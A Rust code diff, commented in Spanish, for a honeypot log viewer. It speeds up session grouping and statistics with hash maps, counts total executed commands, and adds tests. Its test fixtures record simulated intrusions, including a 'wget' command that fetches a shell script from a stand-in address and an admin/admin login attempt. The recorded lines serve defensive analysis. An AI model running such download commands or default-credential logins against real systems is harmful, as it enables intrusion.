@@ -1,6 +1,7 @@
 //! Lee el registro JSONL y lo convierte en un resumen legible.
 
 use crate::log::parse_flat_object;
+use std::collections::HashMap;
 use std::fs;
 use std::path::Path;
 
@@ -42,7 +43,10 @@ pub fn read_sessions(path: &Path) -> Result<Vec<Session>, String> {
     let content =
         fs::read_to_string(path).map_err(|e| format!("no se pudo leer {}: {e}", path.display()))?;
 
+    // El índice de sesiones evita buscar una por una: agrupar ya no cuesta un
+    // cuadrado en el número de sesiones.
     let mut sessions: Vec<Session> = Vec::new();
+    let mut indice: HashMap<String, usize> = HashMap::new();
     for line in content.lines() {
         if line.trim().is_empty() {
             continue;
@@ -51,15 +55,17 @@ pub fn read_sessions(path: &Path) -> Result<Vec<Session>, String> {
             Some(fields) => fields,
             None => continue,
         };
-        let id = field(&fields, "session").unwrap_or("s-?");
-        let index = match sessions.iter().position(|session| session.id == id) {
-            Some(index) => index,
+        let id = field(&fields, "session").unwrap_or("s-?").to_string();
+        let index = match indice.get(&id) {
+            Some(index) => *index,
             None => {
+                let index = sessions.len();
                 sessions.push(Session {
-                    id: id.to_string(),
+                    id: id.clone(),
                     ..Session::default()
                 });
-                sessions.len() - 1
+                indice.insert(id, index);
+                index
             }
         };
         apply_event(&mut sessions[index], &fields);
@@ -136,38 +142,42 @@ pub struct Estadisticas {
 /// Calcula las estadísticas agregadas de un conjunto de sesiones.
 ///
 /// Solo cuenta: no guarda nada nuevo y no necesita ninguna biblioteca.
+///
+/// Los recuentos se llevan con mapas, así que el coste ya no crece con el cuadrado
+/// del número de sesiones ni de órdenes. El resultado es el mismo que antes: los
+/// empates se ordenan por el orden de primera aparición.
 pub fn calcular_estadisticas(sesiones: &[Session]) -> Estadisticas {
-    let mut usuarios: Vec<(String, usize)> = Vec::new();
-    let mut comandos: Vec<(String, usize)> = Vec::new();
-    let mut ips: Vec<String> = Vec::new();
+    let mut usuarios: HashMap<String, usize> = HashMap::new();
+    let mut orden_usuarios: Vec<String> = Vec::new();
+    let mut comandos: HashMap<String, usize> = HashMap::new();
+    let mut orden_comandos: Vec<String> = Vec::new();
+    let mut ips: HashMap<String, ()> = HashMap::new();
+    let mut orden_ips: Vec<String> = Vec::new();
     let mut intentos = 0usize;
+    let mut ordenes_ejecutadas = 0usize;
     let mut descargas = 0usize;
     let mut clics = 0usize;
 
     for sesion in sesiones {
-        if !ips.contains(&sesion.peer) {
-            ips.push(sesion.peer.clone());
+        if !ips.contains_key(&sesion.peer) {
+            ips.insert(sesion.peer.clone(), ());
+            orden_ips.push(sesion.peer.clone());
         }
         for intento in &sesion.attempts {
             intentos += 1;
-            let contador = usuarios
-                .iter_mut()
-                .find(|(usuario, _)| usuario == &intento.user)
-                .map(|(_, total)| total);
-            match contador {
-                Some(total) => *total += 1,
-                None => usuarios.push((intento.user.clone(), 1)),
-            }
+            let total = usuarios.entry(intento.user.clone()).or_insert_with(|| {
+                orden_usuarios.push(intento.user.clone());
+                0
+            });
+            *total += 1;
         }
         for comando in &sesion.commands {
-            let contador = comandos
-                .iter_mut()
-                .find(|(nombre, _)| nombre == comando)
-                .map(|(_, total)| total);
-            match contador {
-                Some(total) => *total += 1,
-                None => comandos.push((comando.clone(), 1)),
-            }
+            ordenes_ejecutadas += 1;
+            let total = comandos.entry(comando.clone()).or_insert_with(|| {
+                orden_comandos.push(comando.clone());
+                0
+            });
+            *total += 1;
         }
         descargas += sesion.downloads.len();
         clics += sesion
@@ -177,20 +187,30 @@ pub fn calcular_estadisticas(sesiones: &[Session]) -> Estadisticas {
             .count();
     }
 
-    // De mayor a menor: el más usado arriba.
-    usuarios.sort_by_key(|(_, total)| std::cmp::Reverse(*total));
-    comandos.sort_by_key(|(_, total)| std::cmp::Reverse(*total));
+    // De mayor a menor: el más usado arriba. Los empates conservan el orden de
+    // primera aparición.
+    let mut ranking_usuarios: Vec<(String, usize)> = orden_usuarios
+        .iter()
+        .map(|usuario| (usuario.clone(), usuarios[usuario]))
+        .collect();
+    ranking_usuarios.sort_by_key(|(_, total)| std::cmp::Reverse(*total));
+    let mut ranking_comandos: Vec<(String, usize)> = orden_comandos
+        .iter()
+        .map(|comando| (comando.clone(), comandos[comando]))
+        .collect();
+    ranking_comandos.sort_by_key(|(_, total)| std::cmp::Reverse(*total));
 
     Estadisticas {
         sesiones: sesiones.len(),
         intentos,
-        comandos: comandos.len(),
+        // El total de órdenes ejecutadas: las repetidas también cuentan.
+        comandos: ordenes_ejecutadas,
         descargas,
         clics,
-        ips_unicas: ips.len(),
-        usuarios_mas_intentados: usuarios.into_iter().take(5).collect(),
-        comandos_mas_usados: comandos.into_iter().take(5).collect(),
-        ips,
+        ips_unicas: orden_ips.len(),
+        usuarios_mas_intentados: ranking_usuarios.into_iter().take(5).collect(),
+        comandos_mas_usados: ranking_comandos.into_iter().take(5).collect(),
+        ips: orden_ips,
     }
 }
 
@@ -378,9 +398,22 @@ mod tests {
         "\n",
         r#"{"ts":"2026-11-20T19:40:07Z","service":"ssh","event":"download_attempt","peer":"127.0.0.1:5001","session":"s-1","command":"wget http://198.51.100.7/x.sh","url":"http://198.51.100.7/x.sh"}"#,
         "\n",
-        r#"{"ts":"2026-11-20T19:40:09Z","service":"ssh","event":"session_end","peer":"127.0.0.1:5001","session":"s-1","duration":"9s"}"#,
+        r#"{"ts":"2026-11-20T19:40:09Z","service":"ssh","event":"session_end","peer":"127.0.0.1:5001","session":"s-1","duration":"1234ms"}"#,
         "\n",
         r#"{"ts":"2026-11-20T19:41:00Z","service":"http","event":"http_post","peer":"127.0.0.1:5002","session":"h-1","method":"POST","path":"/login","user":"admin","password":"admin","status":"200"}"#,
+        "\n",
+    );
+
+    const FIXTURE_REPETIDO: &str = concat!(
+        r#"{"ts":"2026-11-20T19:40:00Z","service":"ssh","event":"connect","peer":"127.0.0.1:5001","session":"s-9"}"#,
+        "\n",
+        r#"{"ts":"2026-11-20T19:40:01Z","service":"ssh","event":"command","peer":"127.0.0.1:5001","session":"s-9","command":"ls"}"#,
+        "\n",
+        r#"{"ts":"2026-11-20T19:40:02Z","service":"ssh","event":"command","peer":"127.0.0.1:5001","session":"s-9","command":"ls"}"#,
+        "\n",
+        r#"{"ts":"2026-11-20T19:40:03Z","service":"ssh","event":"command","peer":"127.0.0.1:5001","session":"s-9","command":"whoami"}"#,
+        "\n",
+        r#"{"ts":"2026-11-20T19:40:04Z","service":"ssh","event":"session_end","peer":"127.0.0.1:5001","session":"s-9","duration":"1234ms"}"#,
         "\n",
     );
 
@@ -411,7 +444,7 @@ mod tests {
         assert!(ssh.accepted);
         assert_eq!(ssh.commands, vec!["uname -a".to_string()]);
         assert_eq!(ssh.downloads, vec!["http://198.51.100.7/x.sh".to_string()]);
-        assert_eq!(ssh.duration.as_deref(), Some("9s"));
+        assert_eq!(ssh.duration.as_deref(), Some("1234ms"));
         let _ = std::fs::remove_file(path);
     }
 
@@ -445,12 +478,30 @@ mod tests {
         let estadisticas = calcular_estadisticas(&sessions);
         assert_eq!(estadisticas.sesiones, 2);
         assert_eq!(estadisticas.intentos, 1);
+        // Aquí solo se ejecutó una orden, así que el total y el número de órdenes
+        // distintas coinciden.
         assert_eq!(estadisticas.comandos, 1);
         assert_eq!(estadisticas.descargas, 1);
         assert_eq!(estadisticas.ips_unicas, 2);
         assert_eq!(estadisticas.usuarios_mas_intentados[0].0, "root");
         assert_eq!(estadisticas.comandos_mas_usados[0].0, "uname -a");
         assert_eq!(estadisticas.ips.len(), 2);
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn las_ordenes_se_cuentan_por_total_y_no_por_distintas() {
+        let path = std::env::temp_dir().join("honeypot-viewer-stats-2.jsonl");
+        std::fs::write(&path, FIXTURE_REPETIDO).expect("no se pudo escribir el fixture");
+        let sessions = read_sessions(&path).expect("no se pudo leer el registro");
+        let estadisticas = calcular_estadisticas(&sessions);
+        // Tres órdenes ejecutadas, aunque solo dos sean distintas.
+        assert_eq!(estadisticas.comandos, 3);
+        // El ranking sigue siendo un recuento de uso por orden.
+        assert_eq!(estadisticas.comandos_mas_usados[0].0, "ls");
+        assert_eq!(estadisticas.comandos_mas_usados[0].1, 2);
+        assert_eq!(estadisticas.comandos_mas_usados[1].0, "whoami");
+        assert_eq!(estadisticas.comandos_mas_usados[1].1, 1);
         let _ = std::fs::remove_file(path);
     }
 
